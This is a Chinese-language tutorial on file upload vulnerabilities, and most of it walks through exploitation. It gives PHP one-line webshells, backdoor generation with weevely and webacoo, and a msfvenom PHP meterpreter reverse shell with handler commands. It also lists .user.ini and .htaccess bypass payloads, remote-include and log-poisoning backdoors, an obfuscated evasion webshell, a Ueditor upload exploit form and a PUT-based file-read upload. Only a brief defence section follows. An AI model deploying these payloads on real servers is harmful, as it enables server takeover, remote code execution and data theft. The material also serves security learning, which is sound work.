# 文件上传漏洞原理与危害

![文件上传漏洞](http://image.daishen.ltd/i/2023/03/06/640578e63b534.jpg)

## 什么是文件上传漏洞？

文件上传漏洞是指当 Web 服务器允许用户将文件上传到其文件系统而没有充分验证其名称、类型、内容或大小等内容时。未能正确执行这些限制可能意味着甚至可以使用基本的图像上传功能来上传任意和潜在危险的文件。这甚至可以包括启用远程代码执行的服务器端脚本文件。

在某些情况下，上传文件的行为本身就足以造成损害。其他攻击可能涉及对文件的后续 HTTP 请求，通常是为了触发服务器执行该文件。

文件上传需要关注的点：

1.有没有文件上传功能

2.文件的大小和内容，无限上传文件造成拒绝服务攻击

3.要明白文件的存储位置

危害：

上传webshell控制服务器数据，可以直接接管服务器

# 文件上传漏洞利用

## 检测方法：

1.检测是否可以上传任意文件

2.检查上传限制，是在前端校验还是后端校验

3.检查是否可以知道上传文件的路径

4.检查上传文件是否含有恶意代码

## 写一个PHP一句话木马

php_001.php

```
<?php system($_GET['cmd']); ?>
```

复制文件路径，访问

```
http://xxx.com/hackable/uploads/php_001.php
```

![image-20210616154640954](http://image.daishen.ltd/i/2023/03/06/64057888092ed.png)



php_002.php

```
<?php @eval($_POST['cmd']); ?>
```

复制文件路径，访问

```
http://xxx.com/hackable/uploads/php_002.php
```

php_003.php

```
<? phpinfo(); ?>
```

复制文件路径，访问

```
http://xxx.com/hackable/uploads/php_003.php
```

## kali  weevely 自动生成木马

```
weevely generate 123456 php_004.php
```

上传

```
weevely http://xxx.com/hackable/uploads/php_004.php 123456
```

![image-20210616160922358](http://image.daishen.ltd/i/2023/03/06/6405789a773f1.png)

## kali  webacoo  自动生成木马

```
webacoo -g -o php_005.php
```

上传

```
 webacoo -t -u http://xxx.com/hackable/uploads/php_005.php
```

![image-20210616161501120](D:\BaiduNetdiskDownload\笔记\安全\WEB漏洞概述\文件上传漏洞\文件上传漏洞.assets\image-20210616161501120.png)

## kali msfconsole  自动生成木马

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.101 LPORT=4444 -f raw -o msf_php_webshell.php
```

上传文件

```
../../hackable/uploads/msf_php_webshell.txt
```

打开kali

```
 msfconsole
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 set LHOST 192.168.168.101
 set LPORT 4444
 show options
 run
 shell
```

访问

```
http://xxx.com/hackable/uploads/php_006.php
```

# 文件上传漏洞防御与绕过

## 绕过

JS验证

禁用JavaScript

JS验证+MIME

```
Content-Type: image/png
```

JS验证+user.ini

```
https://www.cnblogs.com/NineOne/p/14033391.html
.user.ini：auto_prepend_file=test.png
test.png：<?php eval($_POST[x]);?>
```

JS验证+user.ini+短标签

```
<? echo '123';?>                                             //前提是开启配置参数short_open_tags=on
<?=(表达式)?>                                               //不需要开启参数设置
<% echo '123';%>                                          //前提是开启配置参数asp_tags=on

<script language=”php”>echo '1'; </script>   //不需要修改参数开关

.user.ini：auto_prepend_file=test.png
test.png：<?=eval($_POST[x]);?>
```

JS验证+user.ini+短标签+过滤

```
.user.ini：auto_prepend_file=test.png
test.png：<?=eval($_POST{x});?>
```

JS验证+user.ini+短标签+过滤

```
使用反引号运算符的效果与函数 shell_exec()相同
.user.ini：auto_prepend_file=test.png
test.png：<?=system('tac ../fl*')?>
test.png：<? echo `tac /var/www/html/f*`?>
```

JS验证+user.ini+短标签+过滤

```
包含默认日志，日志记录UA头，UA头写后门代码
.user.ini：auto_prepend_file=test.png
test.png：<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

JS验证+user.ini+短标签+过滤+文件头

```
文件头部检测是否为图片格式文件
.user.ini：GIF89A auto_prepend_file=test.png
test.png：GIF89A <?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

突破.过滤

```
过滤 . () {} ;等
利用远程包含IP转换地址后门调用执行
.user.ini auto_prepend_file=png
png <?=include'http://794750069/'>
https://www.bejson.com/convert/ip2int/
```

突破上传删除

```
过滤 . () {} ;等 同时文件被删除
直接利用.user.ini包含远程
auto_prepend_file=http://794750069/
auto_prepend_file=http://794750069/
```

png二次渲染
https://blog.csdn.net/qq_40800734/article/details/105920149

```
get 0=system
post 1=tac flag.php
```

jpg二次渲染

```
1、先上传jpg正常，返回包发现渲染
2、上传jpg渲染后保存，生成带代码图片
调用执行：php jpg.php 1.jpg
```

zip调用包含

```
直接上传zip后修改代码
<?=eval($_POST[x]);?>

.htaccess妙用
.htaccess默认不支持nginx，设置后支持
.htaccess可以通过设置实现文件解析配置
将.png后缀的文件解析成php
AddType application/x-httpd-php .png   
将.png后缀的文件解析成php
```

免杀后门

```
<?php $a='syste';$b='m';$c=$a.$b;$c('tac ../flagaa.php');?>
```

日志包含

```
构造.user.ini利用条件：上传index.php 内容随意
上传.user.ini包含日志：auto_prepend_file=/var/log/nginx/access.log
访问地址带后门UA头写入日志：<?=eval($_POST[x]);?>
```

#中间件文件解析-IIS&Apache&Nginx

```
-IIS 6 7 文件名 目录名
1、文件名：x.asp;.x.jpg
2、目录名：x.asp/x.jpg
3、IIS7.X与Nginx解析漏洞一致

-Apache 换行解析 配置不当
1、换行解析-CVE-2017-15715
其2.4.0~2.4.29版本中存在一个解析漏洞
2、配置不当-.htaccess配置不当
AddHandler application/x-httpd-php .php

-Nginx  文件名逻辑 解析漏洞
1、文件名逻辑-CVE-2013-4547 
影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
2、解析漏洞-nginx.conf配置不当
由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。

#Web应用编辑器-Ueditor文件上传安全

<form action="http://192.168.46.139/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">
<p>shell addr: <input type="text" name="source[]" /></p>
<input type="submit" value="Submit" /> 
</form>
```

上传恶意客户端脚本
虽然您可能无法在服务器上执行脚本，但您仍然可以上传脚本以进行客户端攻击。例如，如果您可以上传 HTML 文件或 SVG 图像，则可以使用<script>标签来创建存储的 XSS负载。如果上传的文件随后出现在其他用户访问的页面上，则他们的浏览器将在尝试呈现该页面时执行该脚本。请注意，由于同源策略的限制，只有当上传的文件是从您上传文件的同一源提供服务时，这些类型的攻击才会起作用。

利用上传文件解析中的漏洞
如果上传的文件似乎已安全存储和提供，最后的手段是尝试利用特定于解析或处理不同文件格式的漏洞。例如，您知道服务器解析基于 XML 的文件，例如 Microsoft Office.doc或文件，这可能是XXE 注入.xls攻击的潜在向量。

使用 PUT 上传文件
值得注意的是，某些 Web 服务器可能配置为支持PUT请求。如果没有适当的防御措施，这可以提供一种上传恶意文件的替代方法，即使上传功能无法通过 Web 界面使用。

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## 防御方法

前端校验:检查文件扩展名、content-type

后端校验:检查文件扩展名、检查文件内容，设置文件权限（不允许执行权限）

根据允许扩展名的白名单而不是禁止扩展名的黑名单检查文件扩展名。猜测您可能想要允许哪些扩展比猜测攻击者可能尝试上传哪些扩展要容易得多。

确保文件名不包含任何可能被解释为目录或遍历序列 ( `../`) 的子字符串。

文件名随机化,重命名上传的文件以避免可能导致现有文件被覆盖的冲突。

沙箱检测,在完全验证之前，不要将文件上传到服务器的永久文件系统。

尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。
